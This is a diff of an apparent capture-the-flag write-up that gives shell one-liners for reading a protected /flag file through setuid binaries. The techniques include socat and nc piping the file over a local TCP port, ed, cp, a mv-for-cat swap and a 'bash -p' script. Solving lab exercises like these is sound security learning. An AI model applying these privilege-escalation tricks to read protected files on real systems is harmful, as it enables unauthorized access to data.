@@ -140,6 +140,9 @@ watch -x cat /flag
 socat -u FILE:"/flag" TCP-LISTEN:5778,reuseaddr
 socat -u TCP:localhost:5778 STDOUT > ~/flag
 cat flag 
+
+t1 -> socat FILE:"/flag" TCP:localhost:50000
+t2 -> nc -l 50000
 ~~~
 
 ## lvl 33
@@ -164,7 +167,7 @@ sed "" /flag
 
 ~~~sh
 ed /flag 
-p (to print the text)
+p # (to print the text)
 ~~~
 
 ## lvl 37
@@ -191,7 +194,7 @@ cp -i --no-preserve=mode,ownership /flag /home/hacker/flag
 
 ~~~sh
 mv /usr/bin/cat /usr/bin/mv
-# challenge file again to set setuid
+# un challenge file again to set setuid to mv
 mv /flag
 ~~~
 
@@ -236,7 +239,7 @@ print file
 ## lvl 44
 
 ~~~sh
-#!/usr/bin/bash -p
+#!/usr/bin/bash -p # important! -p
 file="/flag"
 printf "%s" "$(<$file)" # oppure cat /flag
 ~~~
